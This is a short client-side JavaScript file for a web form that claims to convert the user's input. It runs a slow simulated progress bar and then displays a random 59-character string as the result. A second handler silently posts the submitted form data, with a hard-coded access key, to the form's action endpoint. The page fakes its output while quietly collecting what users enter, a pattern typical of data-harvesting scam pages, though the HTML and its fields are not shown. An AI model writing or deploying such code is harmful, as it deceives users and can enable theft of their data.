// script.js
document.getElementById('form').addEventListener('submit', function(event) {
    event.preventDefault();
    const customLoader = document.getElementById('custom-loader');
    const progressBar = document.getElementById('progress-bar');
    const progressPercent = document.getElementById('progress-percent');
    const codeDisplay = document.getElementById('code-display');

    // Show loader
    customLoader.style.display = 'block';

    // Reset progress bar and percentage
    progressBar.style.width = '0%';
    progressPercent.textContent = '0%';

    // Reset code display
    codeDisplay.textContent = 'Converting..';

    // Simulate loading progress
    let progressWidth = 0;
    const progressInterval = setInterval(() => {
        if (progressWidth >= 100) {
            clearInterval(progressInterval);
            setTimeout(() => {
                customLoader.style.display = 'none';
                // Generate final random code
                const finalRandomCode = Array(59).fill(null).map(() => (Math.random().toString(36).charAt(2) || 0)).join('');
                codeDisplay.textContent = `${finalRandomCode}`;
            }, 800); // Delay to show completion
        } else {
            progressWidth += 1;
            progressBar.style.width = `${progressWidth}%`;
            progressPercent.textContent = `${progressWidth}%`; // Update percentage
        }
    }, 800); // Progress update interval
});

document.getElementById('submit-btn').addEventListener('click', function() {
    const progressContainer = document.querySelector('.progress-container');
    const progressPercent = document.querySelector('.progress-percent');
    const content = document.querySelector('.code-display')

    // Show progress bar and percentage text
    progressContainer.style.display = 'block';
    progressPercent.style.display = 'block';
    content.style.display = 'block';
    

});

const accessKey = "3d2a4918-ac8a-4008-a885-b175d929b5b8";

const form = document.querySelector("form");

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  const formData = new FormData(form);

  const response = await fetch(form.action, {
    method: "POST",
    body: formData,
  });

  const data = await response.json();

  if (data.success) {
    // Success!
  } else {
    // Error!
  }
});